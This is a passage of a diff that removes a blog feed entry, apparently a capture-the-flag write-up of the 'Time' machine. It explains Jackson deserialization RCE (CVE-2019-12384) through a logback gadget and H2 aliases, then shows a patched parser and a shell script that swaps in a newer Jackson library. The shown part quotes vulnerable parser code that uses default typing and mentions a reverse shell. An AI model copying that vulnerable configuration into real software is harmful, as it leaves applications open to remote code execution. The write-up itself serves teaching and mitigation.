-puts content
-
-mapper <span style="color:#f92672">=</span> <span style="color:#66d9ef">ObjectMapper</span><span style="color:#f92672">.</span>new
-mapper<span style="color:#f92672">.</span>enableDefaultTyping() <span style="color:#75715e"># Condition #2, the uses of &#34;default typing&#34;.</span>
-mapper<span style="color:#f92672">.</span>configure(<span style="color:#66d9ef">SerializationFeature</span><span style="color:#f92672">::</span><span style="color:#66d9ef">FAIL_ON_EMPTY_BEANS</span>, <span style="color:#66d9ef">false</span>);
-obj <span style="color:#f92672">=</span> mapper<span style="color:#f92672">.</span>readValue(content, java<span style="color:#f92672">.</span>lang<span style="color:#f92672">.</span>Object<span style="color:#f92672">.</span>java_class) <span style="color:#75715e"># invokes all the setters</span>
-puts <span style="color:#e6db74">&#34;stringified: &#34;</span> <span style="color:#f92672">+</span> mapper<span style="color:#f92672">.</span>writeValueAsString(obj)
-</code></pre></div><p>The third condition is fulfilled by <code>logback-core-1.3.0-alpha5.jar</code> as the gadget class and <code>h2–1.4.199.jar</code> for the RCE capability. According to this <a href="https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html">blog</a>, the H2 database alias feature can be abused. The researcher of CVE-2019–12384 abuses the alias feature to embed Java code.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">root@time:/opt/json_project# grep -Ri version
-Binary file classpath/h2-1.4.199.jar matches
-Binary file classpath/jackson-databind-2.9.8.jar matches
-Binary file classpath/logback-core-1.3.0-alpha5.jar matches
-Binary file classpath/jackson-core-2.9.8.jar matches
-</code></pre></div><h4 id="mitigation">Mitigation</h4>
-<p>After I make sure there is no one currently exploiting the box, I tried to update the Jackson library to the v2.11 and also applied the new feature to mitigate the deserialization attack on the source code. Here is the updated version of <code>parse.rb</code>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">require <span style="color:#e6db74">&#39;java&#39;</span>
-
-<span style="color:#66d9ef">Dir</span><span style="color:#f92672">[</span><span style="color:#e6db74">&#34;/opt/json_project/classpath/*.jar&#34;</span><span style="color:#f92672">].</span>each <span style="color:#66d9ef">do</span> <span style="color:#f92672">|</span>f<span style="color:#f92672">|</span>
-      require f
-<span style="color:#66d9ef">end</span>
-
-java_import <span style="color:#e6db74">&#39;com.fasterxml.jackson.databind.ObjectMapper&#39;</span>
-java_import <span style="color:#e6db74">&#39;com.fasterxml.jackson.databind.SerializationFeature&#39;</span>
-java_import <span style="color:#e6db74">&#39;com.fasterxml.jackson.databind.MapperFeature&#39;</span> <span style="color:#75715e"># ==&gt; Mitigation v2.11 </span>
-f <span style="color:#f92672">=</span> <span style="color:#66d9ef">File</span><span style="color:#f92672">.</span>read(<span style="color:#66d9ef">ARGV</span><span style="color:#f92672">[</span><span style="color:#ae81ff">0</span><span style="color:#f92672">]</span>)
-content <span style="color:#f92672">=</span> f
-puts content
-
-mapper <span style="color:#f92672">=</span> <span style="color:#66d9ef">ObjectMapper</span><span style="color:#f92672">.</span>new
-mapper<span style="color:#f92672">.</span>activateDefaultTyping() <span style="color:#75715e"># ==&gt; Mitigation v2.10, enableDefaultTyping() to activateDefaultTyping() </span>
-mapper<span style="color:#f92672">.</span>configure(<span style="color:#66d9ef">MapperFeature</span><span style="color:#f92672">::</span><span style="color:#66d9ef">BLOCK_UNSAFE_POLYMORPHIC_BASE_TYPES</span>); <span style="color:#75715e"># ==&gt; Mitigation v2.11 </span>
-mapper<span style="color:#f92672">.</span>configure(<span style="color:#66d9ef">SerializationFeature</span><span style="color:#f92672">::</span><span style="color:#66d9ef">FAIL_ON_EMPTY_BEANS</span>, <span style="color:#66d9ef">false</span>);
-obj <span style="color:#f92672">=</span> mapper<span style="color:#f92672">.</span>readValue(content, java<span style="color:#f92672">.</span>lang<span style="color:#f92672">.</span>Object<span style="color:#f92672">.</span>java_class) <span style="color:#75715e"># invokes all the setters</span>
-puts <span style="color:#e6db74">&#34;stringified: &#34;</span> <span style="color:#f92672">+</span> mapper<span style="color:#f92672">.</span>writeValueAsString(obj)
-</code></pre></div><p>I also write a dirty script to patch it as well as to revert the patch, so I can perform a quick test. The script is supposed to be executed  from Time where the updated parser and the newer version of Jackson are  hosted from my machine.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
-</span><span style="color:#75715e"></span><span style="color:#75715e"># ./time.sh patch [ip]</span>
-project_path<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/opt/json_project/&#34;</span>
-new_jackson<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;jackson-core-2.11.0.jar&#34;</span>
-old_jackson<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;jackson-core-2.9.8.jar&#34;</span>
-
-<span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#34;</span>$1<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;patch&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
-	<span style="color:#75715e"># backup the original code</span>
-	mkdir -p /dev/shm/orig/
-	mv $project_path<span style="color:#e6db74">&#34;classpath/&#34;</span>$old_jackson /dev/shm/orig/
-	mv $project_path<span style="color:#e6db74">&#34;parse.rb&#34;</span> /dev/shm/orig/
-	
-	<span style="color:#75715e"># These file hosted from my machine</span>
-	curl -s <span style="color:#e6db74">&#34;http://</span>$2<span style="color:#e6db74">/</span>$new_jackson<span style="color:#e6db74">&#34;</span> &gt; /tmp/$new_jackson
-	curl -s <span style="color:#e6db74">&#34;http://</span>$2<span style="color:#e6db74">/parse.rb&#34;</span> &gt;  /tmp/parse.rb
-	
-	<span style="color:#75715e"># move the updated parser and jackson</span>
-	cp /tmp/$new_jackson $project_path<span style="color:#e6db74">&#34;classpath/&#34;</span>$new_jackson 
-	cp /tmp/parse.rb <span style="color:#e6db74">&#34;</span>$project_path<span style="color:#e6db74">&#34;</span>
-	chmod +x $project_path<span style="color:#e6db74">&#34;parse.rb&#34;</span>
-	
-<span style="color:#66d9ef">elif</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#34;</span>$1<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;restore&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
-	rm $project_path<span style="color:#e6db74">&#34;classpath/&#34;</span>$new_jackson
-	rm $project_path<span style="color:#e6db74">&#34;parse.rb&#34;</span>
-	
-	mv <span style="color:#e6db74">&#34;/dev/shm/orig/</span>$old_jackson<span style="color:#e6db74">&#34;</span> $project_path<span style="color:#e6db74">&#34;classpath/&#34;</span>
-	mv <span style="color:#e6db74">&#34;/dev/shm/orig/parse.rb&#34;</span> $project_path
-	
-	rm /tmp/$new_jackson 
-	rm /tmp/parse.rb
-	rm -r /dev/shm/orig/
-	
-<span style="color:#66d9ef">fi</span>
-</code></pre></div><p>I tried to exploit the validator again by reproducing the same steps as  in the Foothold section, but this time my reverse shell didn’t connect  back. I checked the validator on the browser, and now it returned this  message.</p>
-<pre><code>Validation failed: WARNING: An illegal reflective access operation has occurred
-</code></pre><p><img class="img-container" src="imgs/image-20210509210620009.png" alt="image-20210509210620009"  />
-</p>
-<p>Well, it is working, isn’t it?</p>
-<hr>
-<h2 id="references">References</h2>
-<p>Exploitation:</p>
-<ul>
-<li><a href="https://blog.doyensec.com/2019/07/22/jackson-gadgets.html">https://blog.doyensec.com/2019/07/22/jackson-gadgets.html</a></li>
-<li><a href="https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html">https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html</a></li>
-</ul>
-<p>Mitigation:</p>
-<ul>
-<li><a href="https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062">https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062</a></li>
-<li><a href="https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-450917">https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-450917</a></li>
 </ul>
 ]]></content:encoded>
     </item>
